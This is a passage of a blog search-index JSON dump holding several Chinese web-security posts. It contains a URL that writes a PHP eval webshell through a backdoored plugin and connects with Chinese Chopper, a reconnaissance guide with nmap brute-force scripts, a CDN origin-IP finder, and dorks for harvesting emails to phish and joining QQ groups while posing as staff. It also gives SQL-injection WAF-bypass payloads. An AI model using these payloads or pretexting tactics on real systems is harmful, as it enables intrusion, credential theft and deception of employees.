1&#x2F;www&#x2F;wwwroot&#x2F;xxx.xxx.com&#x2F; 然后访问如下写入一个shell 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;admin.php&#x2F;plugins&#x2F;awd&#x2F;awd.php?a&#x3D;file_put_contents(&#39;&#x2F;www&#x2F;wwwroot&#x2F;xxx.xxx.com&#x2F;public&#x2F;upload&#x2F;test.php&#39;,&#39;&lt;?php @eval($_REQUEST[abc]);&#39;); 然后利用菜刀连接http://xxx.xxx.xxx/upload/test.php密码abc即可","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"信息收集之我见","slug":"信息收集之我见","date":"2019-12-17T18:59:08.000Z","updated":"2019-12-17T19:21:48.080Z","comments":true,"path":"2019/12/18/信息收集之我见/","link":"","permalink":"http://yoursite.com/2019/12/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B9%8B%E6%88%91%E8%A7%81/","excerpt":"","text":"信息收集之我见标签（空格分隔）： web安全 来源网络，回馈网络 对一个网站挖掘的深浅来说就得看你收集的如何，这说明信息收集在漏洞挖掘中是非常的重要的。 子域名收集子域名收集是最简单的收集手法之一，有很多在线的工具可以直接套用，这里分享几个我经常用的。 开心的时候用用这个扫描器为什么这么说，因为这是我写的（你生气用的话我怕我屏幕里突然冒出一个拖孩） 1import requests2import threading3from bs4 import BeautifulSoup4import re5import time67url = input( 'url(如baidu.com): ' )89head=&#123;'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'&#125;1011ip = 'http://site.ip138.com/&#123;&#125;'.format( url )12# domain_url = url.split('.')13# domain_url = domain_url[1]+'.'+domain_url[2]14domain_url = url15domain = 'http://site.ip138.com/&#123;&#125;/domain.htm'.format( domain_url )1617t = time.strftime(\"%Y-%m-%d\"+'_', time.localtime())18html_file = open( url+'_'+t+'.html','w' )1920html_file.write( '''2122&lt;head&gt;2324&lt;title&gt;%s的扫描结果&lt;/title&gt;25&lt;link rel=\"stylesheet\" href=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/css/bootstrap.min.css\"&gt;26&lt;script src=\"https://cdn.staticfile.org/jquery/2.1.1/jquery.min.js\"&gt;&lt;/script&gt;27&lt;script src=\"https://cdn.staticfile.org/twitter-bootstrap/3.3.7/js/bootstrap.min.js\"&gt;&lt;/script&gt;28&lt;style&gt;2930pre&#123;3132margin: 0 0 0px;3334&#125;3536&lt;/style&gt;37&lt;/head&gt;3839&lt;ul id=\"myTab\" class=\"nav nav-tabs navbar-fixed-top navbar navbar-default\"&gt;40 &lt;li class=\"active\"&gt;41 &lt;a href=\"#ip\" data-toggle=\"tab\"&gt;42 IP历史解析43 &lt;/a&gt;44 &lt;/li&gt;45 &lt;li&gt;&lt;a href=\"#cms\" data-toggle=\"tab\"&gt;CMS识别&lt;/a&gt;&lt;/li&gt;46 &lt;li&gt;&lt;a href=\"#domain\" data-toggle=\"tab\"&gt;子域名信息&lt;/a&gt;&lt;/li&gt;47&lt;/ul&gt;48&lt;br&gt;49&lt;br&gt;50&lt;br&gt;51&lt;br&gt;52&lt;div id=\"myTabContent\" class=\"tab-content\"&gt;53'''%url )5455class IP( threading.Thread ):56 def __init__(self, ip):57 threading.Thread.__init__(self)58 self.ip = ip59 def run(self):60 r = requests.get( self.ip,headers = head )61 html = r.text62 bs = BeautifulSoup(html, \"html.parser\")63 html_file.write('&lt;div class=\"tab-pane fade in active\" id=\"ip\"&gt;')64 for i in bs.find_all('p'):65 ipc = i.get_text()66 ip_html = '&lt;pre&gt;&#123;&#125;&lt;/pre&gt;'.format( ipc )67 html_file.write( ip_html )68 html_file.write('&lt;/div&gt;')6970class CMS( threading.Thread ):71 def __init__(self, cms):72 threading.Thread.__init__(self)73 self.cms = cms74 def run(self):75 cms = requests.post('http://whatweb.bugscaner.com/what/', data=&#123;'url': self.cms&#125;, headers = head)76 text = cms.text77 Web_Frameworks = re.search('\"Web Frameworks\": \"(.*?)\"]', text)78 Programming_Languages = re.search('\"Programming Languages\":(.*?)\"]', text)79 JavaScript_Frameworks = re.search('\"JavaScript Frameworks\": (.*?)\"]', text)80 CMS = re.search('\"CMS\": (.*?)\"]', text)81 Web_Server = re.search('\"Web Servers\": (.*?)\"]', text)82 if CMS:83 CMS = CMS.group(1)+'\"]'84 if Programming_Languages:85 Programming_Languages = Programming_Languages.group(1)+'\"]'86 if JavaScript_Frameworks:87 JavaScript_Frameworks = JavaScript_Frameworks.group(1)+'\"]'88 if Web_Frameworks:89 Web_Frameworks = Web_Frameworks.group(1)+'\"]'90 if Web_Server:91 Web_Server = Web_Server.group(1)+'\"]'92 html = '''93 &lt;div class=\"tab-pane fade\" id=\"cms\"&gt;94 &lt;div class=\"table-responsive\"&gt;95 &lt;table class=\"table table-condensed\"&gt;96 &lt;tr&gt;97 &lt;th&gt;web框架&lt;/th&gt;98 &lt;th&gt;脚本版本&lt;/th&gt;99 &lt;th&gt;JavaScript框架&lt;/th&gt;100 &lt;th&gt;CMS框架&lt;/th&gt;101 &lt;th&gt;web服务器&lt;/th&gt;102 &lt;/tr&gt;103 &lt;tr&gt;104 &lt;td&gt;&#123;0&#125;&lt;/td&gt;105 &lt;td&gt;&#123;1&#125;&lt;/td&gt;106 &lt;td&gt;&#123;2&#125;&lt;/td&gt;107 &lt;td&gt;&#123;3&#125;&lt;/td&gt;108 &lt;td&gt;&#123;4&#125;&lt;/td&gt;109 &lt;/tr&gt;110 &lt;/table&gt;111 &lt;/div&gt;112 &lt;/div&gt;113 '''.format(Web_Frameworks,Programming_Languages,JavaScript_Frameworks,CMS,Web_Server)114 html_file.write( html )115116class DOMAIN( threading.Thread ):117 def __init__(self, domain):118 threading.Thread.__init__(self)119 self.domain = domain120 def run(self):121 r = requests.get( self.domain,headers = head )122 html = r.text123 bs = BeautifulSoup(html, \"html.parser\")124 html_file.write('&lt;div class=\"tab-pane fade in active\" id=\"domain\"')125 num = 0126 for i in bs.find_all('p'):127 num += 1128 html_file.write( '&lt;br&gt;' )129 domainc = i.get_text()130 domain_html = '&lt;pre&gt;[&#123;&#125;]： &#123;&#125;&lt;/pre&gt;'.format( num,domainc )131 html_file.write( domain_html )132 print( domain_html )133 html_file.write('&lt;/div&gt;')134135ip_cls = IP(ip)136ip_html = ip_cls.run()137138cms_cls = CMS(url)139cms_html = cms_cls.run()140141domain_cls = DOMAIN( domain )142domain_html = domain_cls.run() github开源的子域名扫描器https://github.com/lijiejie/subDomainsBrutehttps://github.com/chuhades/dnsbrute 在线网站收集1、https://d.chinacycc.com/（非常推荐） 然后不到30秒就出结果了 2、http://z.zcjun.com/https://phpinfo.me/domain/ 端口信息收集扫描端口并且标记可以爆破的服务1nmap 目标 --script&#x3D;ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute 判断常见的漏洞并扫描端口1nmap 目标 --script&#x3D;auth,vuln 精确判断漏洞并扫描端口1nmap 目标 --script&#x3D;dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version 我喜欢这样做1、扫描子域名 提取出域名/ip 然后把域名放到975.txt 2、批量扫描端口和漏洞检测 1nmap -iL 975.txt --script&#x3D;auth,vuln,ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute &gt; scan.txt 然后根据对应开放的端口进行针对性漏洞挖掘 c段信息收集c段的话我一般都是使用iis put这款工具来扫描，可以自定义扫描1-255的端口并且还有返回服务器banner信息 自定义的端口 1135,139,80,8080,15672,873,8983,7001,4848,6379,2381,8161,11211,5335,5336,7809,2181,9200,50070,50075,5984,2375,7809,16992,16993 这里只是演示下他跑起来的美 目录信息收集目录收集工具有很多，但是最看重的还是目录字典，之前我拿了很多工具的字典去重集合起来超级超级大，只不过是在之前电脑那里还原的时候忘记了备份、、、（说这句话主要是想让你们也可以这样子做，方便自己，然后发我一份，方便你我） 这里推荐一个工具7kbstorm https://github.com/7kbstorm/7kbscan-WebPathBrute 像403、404这种页面千万不要关闭，放目录里面扫就ok 谷歌语法收集铭感文件最常见的就是用搜索引擎~ 1site:ooxx.com filetype:xls 首先试试百度 $!@!~~WDwadawicnm 试试必应 这里主要是收集网站敏感文件（比如目标的某个系统手册演示的截图中截图到了用户名，然后我们可以根据用户名来爆破密码；甚至可以看看有没有写系统默认密码，或者一些后台的目录路径，如果有目录就可以尝试对其访问，说不定有未授权~） 还能尝试对后台进行查找 1site:xxx.xxx admin2site:xxx.xxx login3site:xxx.xxx system4site:xxx.xxx 管理5site:xxx.xxx 登录6site:xxx.xxx 内部7site:xxx.xxx 系统 还可以查找邮箱，然后进行钓鱼 1site:xxx.xxx 邮件2site:xxx.xxx email 还可以查找qq群等，然后假装员工验证进去看群文件泄露了什么东东（这里有个技巧，去找客服聊天处，然后对整个过程抓包也就是看历史请求，如果运气好可能在请求的返回包中返回客服的姓名，如果只单纯的泄露了姓如张xx，那么你加群的时候就说你是小张工作号，说这个工作号的原因是可能小张已经在群里了） 1注意事项：如果你是挖腾讯的话就不要看这条啦2site:xxx.xxx qq3site:xxx.xxx 群4site:xxx.xxx 企鹅5site:xxx.xxx 腾讯 还可以对寻找一些公开的、危害大、普遍的漏洞的指纹，如下面的搜索jboss系统 1site:ooxx.com inurl:jmx-console 小技巧比如下面一个站存在越权（但是越权的对象很难猜测） 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;userinfo&#x2F;?uid&#x3D;2018-WOIDJWOIDJ-5201314 那么我们可以尝试用搜索引擎来找 1site:xxx.xxx inurl&#x3D;uid&#x3D;20 利用云网盘搜索工具搜集敏感文件 公司员工可能把一些内部资料放在了公网网盘，然后被在线云网盘搜索的网站抓取了，我们就可以利用这个来对目标系统进行深入交流 我这边主要用凌风云搜索 https://www.lingfengyun.com/ 个人喜欢直接输入厂商名字然后搜索（比较全），然后边看电视（最好看鬼片，鬼出来的阶段想着找找找）边搜索 利用gayhub来收集信息1、打开gayhub 这里就是找gayhub全部开源项目内容中存在联想这个关键字的项目，这样子可以搜集到的方面更广，如果单纯只是对标题搜索，那么他们改成了lenovo你就搜不到了 然后说再多，也没这个好用 https://sec.xiaomi.com/article/37 针对网站性收集1、把网站弄报错，看是什么cms，或者看返回包回显是什么中间件这些2、看是linux还是window如目标url是www.onlyfree.xxx/login，那么改成www.onlyfree.xxx/Login看看能不能访问，如果可以访问就可能是window，否则可能是linux 3、可以去云溪等在线识别指纹的网站看指纹信息http://whatweb.bugscaner.com/look/http://www.yunsee.cn/finger.html 4、对waf进行识别这里有一款开源的识别工具，挺好用的https://github.com/EnableSecurity/wafw00f 5、对网站whois查询看注册人、手机号、邮箱等（可以收集起来放到密码生成工具）6、看html源代码，在一起项目测试的时候，我在找html源代码的时候发现一个注释的js文件，我将其打开后，里面的备注居然是配置信息。。。后台地址、管理员账号和密码等（可是我没get到shell，所以你要知道这回事而不要记住这件事）7、网站真实ip识别，下面是我用的一个工具，但是我忘记哪里下载的了，我原封不漏的粘贴出来1#############################################################2### 3### ▄▄▄▄ ▄▄▄ ▄▄▄▄ ▀ ▄ 4### ▀ ▀█ ▄ ▄ ▄▄▄▄ █ ▄▀ ▀▄ ▄▄▄ ▄▄█▄▄ 5### ▄▄▄▀ █▄█ █▀ ▀█ █ █ ▄ █ █ █ 6### ▀█ ▄█▄ █ █ █ █ █ █ █ 7### ▀▄▄▄█▀ ▄▀ ▀▄ ██▄█▀ ▄▄█▄▄ █▄▄█ ▄▄█▄▄ ▀▄▄ 8### █ 9### ▀ 10### 11### name: xcdn.py12### function: try to get the actual ip behind cdn13### date: 2016-11-0514### author: quanyechavshuo15### blog: http://3xp10it.cc16#############################################################17# usage:python3 xcdn.py www.baidu.com18import time19import os20os.system(\"pip3 install exp10it -U --no-cache-dir\") 21from exp10it import figlet2file22figlet2file(\"3xp10it\",0,True)23time.sleep(1)2425from exp10it import CLIOutput26from exp10it import get_root_domain27from exp10it import get_string_from_command28from exp10it import get_http_or_https29from exp10it import post_request30from exp10it import get_request31from exp10it import checkvpn32import sys33import re3435class Xcdn(object):3637 def __init__(self,domain):38 #必须保证连上了vpn,要在可以ping通google的条件下使用本工具,否则有些domain由于被GFW拦截无法正常访问会导致39 #本工具判断错误,checkvpn在可以ping通google的条件下返回140 while 1:41 if checkvpn()==1:42 break43 else:44 time.sleep(1)45 print(\"vpn is off,connect vpn first\")46 if domain[:4]==\"http\":47 print(\"domain format error,make sure domain has no http,like www.baidu.com but not \\48http://www.baidu.com\")49 sys.exit(0)50 #首先保证hosts文件中没有与domain相关的项,有则删除相关51 domainPattern=domain.replace(\".\",\"\\.\")52 #下面的sed的正则中不能有\\n,sed匹配\\n比较特殊53 #http://stackoverflow.com/questions/1251999/how-can-i-replace-a-newline-n-using-sed54 command=\"sed -ri 's/.*\\s+%s//' /etc/hosts\" % domainPattern55 os.system(command)5657 self.domain=domain58 self.http_or_https=get_http_or_https(self.domain)59 print('domain的http或https是:%s' % self.http_or_https)60 result=get_request(self.http_or_https+\"://\"+self.domain,'seleniumPhantomJS')61 self.domain_title=result['title']62 #下面调用相当于main函数的get_actual_ip_from_domain函数63 actual_ip = self.get_actual_ip_from_domain()64 if actual_ip != 0:65 print(\"恭喜,%s的真实ip是%s\" % (self.domain, actual_ip))66 #下面用来存放关键返回值67 self.return_value=actual_ip6869 70 def domain_has_cdn(self):71 # 检测domain是否有cdn72 # 有cdn时,返回一个字典,如果cdn是cloudflare，返回&#123;'has_cdn':1,'is_cloud_flare':1&#125;73 # 否则返回&#123;'has_cdn':1,'is_cloud_flare':0&#125;或&#123;'has_cdn':0,'is_cloud_flare':0&#125;74 import re75 CLIOutput().good_print(\"现在检测domain:%s是否有cdn\" % self.domain)76 has_cdn = 077 # ns记录和mx记录一样,都要查顶级域名,eg.dig +short www.baidu.com ns VS dig +short baidu.com ns78 result = get_string_from_command(\"dig ns %s +short\" % get_root_domain(self.domain))79 pattern = re.compile(80 r\"(cloudflare)|(cdn)|(cloud)|(fast)|(incapsula)|(photon)|(cachefly)|(wppronto)|(softlayer)|(incapsula)|(jsdelivr)|(akamai)\", re.I)81 cloudflare_pattern = re.compile(r\"cloudflare\", re.I)82 if re.search(pattern, result):83 if re.search(cloudflare_pattern, result):84 print(\"has_cdn=1 from ns,and cdn is cloudflare\")85 return &#123;'has_cdn': 1, 'is_cloud_flare': 1&#125;86 else:87 print(\"has_cdn=1 from ns\")88 return &#123;'has_cdn': 1, 'is_cloud_flare': 0&#125;89 else:90 # 下面通过a记录个数来判断,如果a记录个数&gt;1个,认为有cdn91 result = get_string_from_command(\"dig a %s +short\" % self.domain)92 find_a_record_pattern = re.findall(r\"((\\d&#123;1,3&#125;\\.)&#123;3&#125;\\d&#123;1,3&#125;)\", result)93 if find_a_record_pattern:94 ip_count = 095 for each in find_a_record_pattern:96 ip_count += 197 if ip_count &gt; 1:98 has_cdn = 199 return &#123;'has_cdn': 1, 'is_cloud_flare': 0&#125;100 return &#123;'has_cdn': 0, 'is_cloud_flare': 0&#125;101102103 def get_domain_actual_ip_from_phpinfo(self):104 # 从phpinfo页面尝试获得真实ip105 CLIOutput().good_print(\"现在尝试从domain:%s可能存在的phpinfo页面获取真实ip\" % self.domain)106 phpinfo_page_list = [\"info.php\", \"phpinfo.php\", \"test.php\", \"l.php\"]107 for each in phpinfo_page_list:108 url = self.http_or_https + \"://\" + self.domain + \"/\" + each109 CLIOutput().good_print(\"现在访问%s\" % url)110 visit = get_request(url,'seleniumPhantomJS')111 code = visit['code']112 content = visit['content']113 pattern = re.compile(r\"remote_addr\", re.I)114 if code == 200 and re.search(pattern, content):115 print(each)116 actual_ip = re.search(r\"REMOTE_ADDR[^\\.\\d]+([\\d\\.]&#123;7,15&#125;)[^\\.\\d]+\", content).group(1)117 return actual_ip118 # return 0代表没有通过phpinfo页面得到真实ip119 return 0120121122 def flush_dns(self):123 # 这个函数用来刷新本地dns cache124 # 要刷新dns cache才能让修改hosts文件有效125 CLIOutput().good_print(\"现在刷新系统的dns cache\")126 command = \"service network-manager restart &amp;&amp; /etc/init.d/networking force-reload\"127 os.system(command)128 import time129 time.sleep(3)130131132 def modify_hosts_file_with_ip_and_domain(self,ip):133 # 这个函数用来修改hosts文件134 CLIOutput().good_print(\"现在修改hosts文件\")135 exists_domain_line = False136 with open(\"/etc/hosts\", \"r+\") as f:137 file_content = f.read()138 if re.search(r\"%s\" % self.domain.replace(\".\", \"\\.\"), file_content):139 exists_domain_line = True140 if exists_domain_line == True:141 os.system(\"sed -ri 's/.*%s.*/%s %s/' %s\" % (self.domain.replace(\".\", \"\\.\"), ip, self.domain, \"/etc/hosts\"))142 else:143 os.system(\"echo %s %s &gt;&gt; /etc/hosts\" % (ip, self.domain))144145146 def check_if_ip_is_actual_ip_of_domain(self,ip):147 # 通过修改hosts文件检测ip是否是domain对应的真实ip148 # 如果是则返回True,否则返回False149 #CLIOutput().good_print(\"现在通过修改hosts文件并刷新dns的方法检测ip:%s是否是domain:%s的真实ip\" % (ip,self.domain))150 #python通过requests库或mechanicalsoup库或selenium_phantomjs来请求时不会被dns缓存影响，只会被hosts文件影响dns解析,人工用浏览器访问域名则会受dns缓存影响151 CLIOutput().good_print(\"现在通过修改hosts文件的方法检测ip:%s是否是domain:%s的真实ip\" % (ip,self.domain))152 os.system(\"cp /etc/hosts /etc/hosts.bak\")153 self.modify_hosts_file_with_ip_and_domain(ip)154 #python通过requests库或mechanicalsoup库或selenium_phantomjs来请求时不会被dns缓存影响，只会被hosts文件影响dns解析,人工用浏览器访问域名则会受dns缓存影响155 #self.flush_dns()156 hosts_changed_domain_title= get_request(self.http_or_https + \"://%s\" % self.domain,'selenium_phantom_js')['title']157 os.system(\"rm /etc/hosts &amp;&amp; mv /etc/hosts.bak /etc/hosts\")158 #这里要用title判断,html判断不可以,title相同则认为相同159 if self.domain_title == hosts_changed_domain_title:160 CLIOutput().good_print(\"检测到真实ip!!!!!!\",'red')161 return True162 else:163 CLIOutput().good_print(\"当前ip不是域名的真实ip\",'yellow')164 return False165166167 def get_c_80_or_443_list(self,ip):168 # 得到ip的整个c段的开放80端口或443端口的ip列表169 if \"not found\" in get_string_from_command(\"masscan\"):170 #这里不用nmap扫描,nmap扫描结果不准171 os.system(\"apt-get install masscan\")172 if self.http_or_https==\"http\":173 scanPort=80174 CLIOutput().good_print(\"现在进行%s的c段开了80端口机器的扫描\" % ip)175 if self.http_or_https==\"https\":176 scanPort=443177 CLIOutput().good_print(\"现在进行%s的c段开了443端口机器的扫描\" % ip)178 masscan_command = \"masscan -p%d %s/24 &gt; /tmp/masscan.out\" % (scanPort,ip)179 os.system(masscan_command)180 with open(\"/tmp/masscan.out\", \"r+\") as f:181 strings = f.read()182 #os.system(\"rm /tmp/masscan.out\")183 import re184 allIP=re.findall(r\"((\\d&#123;1,3&#125;\\.)&#123;3&#125;\\d&#123;1,3&#125;)\",strings)185 ipList=[]186 for each in allIP:187 ipList.append(each[0])188 print(ipList)189 return ipList190191192 def check_if_ip_c_machines_has_actual_ip_of_domain(self,ip):193 # 检测ip的c段有没有domain的真实ip,如果有则返回真实ip,如果没有则返回0194 CLIOutput().good_print(\"现在检测ip为%s的c段中有没有%s的真实ip\" % (ip,self.domain))195 target_list=self.get_c_80_or_443_list(ip)196 for each_ip in target_list:197 if True == self.check_if_ip_is_actual_ip_of_domain(each_ip):198 return each_ip199 return 0200201202 def get_ip_from_mx_record(self):203 # 从mx记录中得到ip列表,尝试从mx记录中的c段中找真实ip204 print(\"尝试从mx记录中找和%s顶级域名相同的mx主机\" % self.domain)205 import socket206 # domain.eg:www.baidu.com207 from exp10it import get_root_domain208 root_domain = get_root_domain(self.domain)209 from exp10it import get_string_from_command210 result = get_string_from_command(\"dig %s +short mx\" % root_domain)211 sub_domains_list = re.findall(r\"\\d&#123;1,&#125; (.*\\.%s)\\.\" % root_domain.replace(\".\", \"\\.\"), result)212 ip_list = []213 for each in sub_domains_list:214 print(each)215 ip = socket.gethostbyname_ex(each)[2]216 if ip[0] not in ip_list:217 ip_list.append(ip[0])218 return ip_list219220221 def check_if_mx_c_machines_has_actual_ip_of_domain(self):222 # 检测domain的mx记录所在ip[或ip列表]的c段中有没有domain的真实ip223 # 有则返回真实ip,没有则返回0224 CLIOutput().good_print(\"尝试从mx记录的c段中查找是否存在%s的真实ip\" % self.domain)225 ip_list = self.get_ip_from_mx_record()226 if ip_list != []:227 for each_ip in ip_list:228 result = self.check_if_ip_c_machines_has_actual_ip_of_domain(each_ip)229 if result != 0:230 return result231 else:232 continue233 return 0234235236 def get_ip_value_from_online_cloudflare_interface(self):237 # 从在线的cloudflare查询真实ip接口处查询真实ip238 # 如果查询到真实ip则返回ip值,如果没有查询到则返回0239 CLIOutput().good_print(\"现在从在线cloudflare类型cdn查询真实ip接口尝试获取真实ip\")240 url = \"http://www.crimeflare.com/cgi-bin/cfsearch.cgi\"241 post_data = 'cfS=%s' % self.domain242 content = post_request(url, post_data)243 findIp = re.search(r\"((\\d&#123;1,3&#125;\\.)&#123;3&#125;\\d&#123;1,3&#125;)\", content)244 if findIp:245 return findIp.group(1)246 return 0247248249 def get_actual_ip_from_domain(self):250 # 尝试获得domain背后的真实ip,前提是domain有cdn251 # 如果找到了则返回ip,如果没有找到返回0252 CLIOutput().good_print(\"进入获取真实ip函数,认为每个domain都是有cdn的情况来处理\")253 import socket254 has_cdn_value = self.domain_has_cdn()255 if has_cdn_value['has_cdn'] == 1:256 CLIOutput().good_print(\"检测到domain:%s的A记录不止一个,认为它有cdn\" % self.domain)257 pass258 else:259 CLIOutput().good_print(\"Attention...!!! Domain doesn't have cdn,I will return the only one ip\")260 true_ip = socket.gethostbyname_ex(self.domain)[2][0]261 return true_ip262 # 下面尝试通过cloudflare在线查询真实ip接口获取真实ip263 if has_cdn_value['is_cloud_flare'] == 1:264 ip_value = self.get_ip_value_from_online_cloudflare_interface()265 if ip_value != 0:266 return ip_value267 else:268 pass269 # 下面尝试通过可能存在的phpinfo页面获得真实ip270 ip_from_phpinfo = self.get_domain_actual_ip_from_phpinfo()271 if ip_from_phpinfo == 0:272 pass273 else:274 return ip_from_phpinfo275 # 下面通过mx记录来尝试获得真实ip276 result = self.check_if_mx_c_machines_has_actual_ip_of_domain()277 if result == 0:278 pass279 else:280 return result281 print(\"很遗憾,在下认为%s有cdn,但是目前在下的能力没能获取它的真实ip,当前函数将返回0\" % self.domain)282 return 0283284285if __name__ == '__main__':286 import sys287 domain=sys.argv[1]288 Xcdn(domain) 8、服务器ssh配置信息丢工具：https://github.com/mozilla/ssh_scan 9、敏感文件爆破 svn源代码泄露使用svn版本控制系统时，错误操作将.svn文件存放，那么久可以看他SVN服务器账号密码等信息 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;.svn&#x2F;entries 10、根据目标系统情况根据目标系统情况是因为看他对应的系统是什么对应有什么漏洞，下面这个是tomcat的session泄露 1&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;SessionExample&#x2F;examples&#x2F;2&#x2F;examples&#x2F;servlets&#x2F;servlet&#x2F;SessionExample3&#x2F;examples&#x2F; 敏感目录泄露 WEB-INF/web.xml泄露 WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问 1&#x2F;WEB-INF&#x2F;config&#x2F;jdbc.properties2&#x2F;WEB-INF&#x2F;web.xml3&#x2F;WEB-INF&#x2F;classes&#x2F;4&#x2F;WEB-INF&#x2F;lib&#x2F;5&#x2F;WEB-INF&#x2F;src&#x2F;6&#x2F;WEB-INF&#x2F;database.properties bzr泄露 通过它我们可以看项目历史 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;.bzr&#x2F; 网站源代码泄露 不多介绍，可能管理员觉得网站不安全，需要我们审计一下 1www.zip2www.tar.gz3www.rar4web.zip5web.rar6... 这些有很多，，不一一详细，后面我会将这些全部集合在一个字典里，然后我们可以放入目录遍历的工具里批量扫~ 利用shodan、fofa等收集信息查找标题是携程并且语言是国语的站点 1https:&#x2F;&#x2F;www.shodan.io&#x2F;search?query&#x3D;http.title:&quot;携程&quot; country:&quot;CN&quot; 我们可以将其收藏为文件夹，方便下次打开，然后记录时间，看看有没有新上线的（这里已经有监控的功能，各位师傅可以去看看米斯特大佬写的shodan监控文章，很有趣很实用） shodan、fofa不多介绍了，有对应的手册，见的肯定比我好 思路扩展思路扩展就是在a功能点中找出b功能点，以此类推 比如一些后台登录是 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;admin-login 我们是不是可以尝试吧login改成register来注册 再比如获取用户手机号的接口（这里不存在越权） 1http:&#x2F;&#x2F;xxx.xxx.xxx&#x2F;user&#x2F;GetPhone&#x2F;?id&#x3D;1 然后我们把GetPhone改成GetPasswd或者GetPwd或者GetPassword然后id就可能可以越权，或者这里可以json劫持或者origin劫持等，我们可以诱导用户点开来劫持账号密码 或者还是看源代码，然后搜索hidden（滑稽），我们可能可能会找到敏感操作的按钮，然后管理员也知道敏感，将其”隐藏”了，我们可以根据这个来搜索然后访问他，嘿嘿嘿（之前对一个小站点进行挖掘的时候我hidden找居然找到了不可描述的目录下面放着不可描述的电影，当时我的心情是非常拒绝的，经过几小时的思考我迅速的将那个目录关闭了，毕竟我是祖国的花朵） 这里有很多是adrian师傅与我分享的，然后暂时只写那么多吧（其实还有几个，怕触犯到权什么的就是他给你学了但不给我写的那种，很麻烦所以就以后有机会再写吧），如果遇到了更多我会补充 来源于网络，回馈于网络","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"sql注入绕过过滤总结","slug":"sql注入绕过过滤总结","date":"2019-12-17T18:58:26.000Z","updated":"2019-12-17T19:20:58.015Z","comments":true,"path":"2019/12/18/sql注入绕过过滤总结/","link":"","permalink":"http://yoursite.com/2019/12/18/sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E6%80%BB%E7%BB%93/","excerpt":"","text":"MSSQL数据库特性 注释绕过： MSSQL也可以使用/**/注释 浮点数： select * from user where id=1.1union select 1,&#39;2&#39;,db_name() from user 1EO形式 select * from user where id=1e0union select 1,&#39;2&#39;,db_name() from user 如执行 1select * from user where id=1.eunion select xxxxxxx 等同于 1select * from user where id=1 union select xxxxxxx 但是这样可以绕过对union select的防御 HPP特性ASPX+IIS搭配的时候同时提交参数id，会接收所有的参数，通过逗号分割，比如在cookie、post、get里都传入id=1，那么最终的结果会是1,1,1 再比如这个url:http://www.a.com/index.php?id=1存在sql注入，那么可与这样子 get请求中传入如下参数 1http://www.a.com/index.php?id=1.eunion/**/select null,null,name/* 然后在post请求中传入如下参数 1id=*/from xxxxxxx 最终的输出结果就会变成这个样子 1select * from 1.eunion/**/select null,null,name/*,*/from xxxxxxx MYSQL特性内联注释1内联注释：/*!12345union*/select 如下方法可以快速的检测某处是否存在sql注入漏洞 1http://www.xxx.com/index.php?id=1/*!12345union*/select/*!union12345sleep(5)*/; {x xxxx}1select * from &#123;x user&#125; 结果和这样一样 1select * from user E01E0在mysql里是效果等于空格 浮点数 1.1union select * from xxxxx 然后就会变成 1select * from xxxx where id=1.1union select * from xxxxx 这样子的话id就是不存在然后就会执行后面的SQL语句 一些POC11、/*!12345select*//**/from22、/*!50001select*/from33、Select/**/column_name/**/from44、/*!/*!select*/column_name/*!/*!from*/55、空格用/*!*/代替66、%53elect/*!1,2,schema_name%0aFROM77、Get+Post，编码，超长内容等等。","categories":[{"name":"兴趣爱好","slug":"兴趣爱好","permalink":"http://yoursite.com/categories/%E5%85%B4%E8%B6%A3%E7%88%B1%E5%A5%BD/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"http://yoursite.com/tags/Web%E5%AE%89%E5%85%A8/"}]},{"title":"xss绕过过滤总结","slug":"xss绕过过滤总结","date":"2019-12-17T18:56:48.000Z","updated":"2019-12-17T19:20:55.266Z","comments":true,"path":"2019/12/18/xss绕过过滤总结/","link":"","permalink":"http://yoursite.com/2019/12/18/xss%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E6%80%BB%E7%BB%93/","excerpt":"","text":"xss漏洞不多介绍，烂大街的~ 这里就讲这么绕过一些过滤 验证了on事件=比如验证的是如下符号存在就会拦截 